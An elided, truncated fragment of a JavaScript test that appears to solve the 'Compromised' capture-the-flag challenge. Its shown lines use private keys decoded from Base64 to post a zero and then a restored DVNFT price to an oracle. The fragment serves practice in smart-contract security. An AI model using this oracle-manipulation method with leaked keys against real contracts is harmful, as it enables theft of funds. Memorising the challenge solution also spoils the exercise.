...
describe('Compromised challenge', function () {
  ...
  it('Execution', async function () {
    ...
    // Private key decoded from Base64 string
    ...
    await wallet1.sendTransaction({
      to: oracle.address,
      data: interface.encodeFunctionData('postPrice', ['DVNFT', '0']),
    })
    ...
    await wallet1.sendTransaction({
      to: oracle.address,
      data: interface.encodeFunctionData('postPrice', ['DVNFT', INITIAL_NFT_PRICE]),
    })
    await wallet2.sendTransaction({
      to: oracle.address,
      data: interface.encodeFunctionData('postPrice', ['DVNFT', INITIAL_NFT_PRICE]),
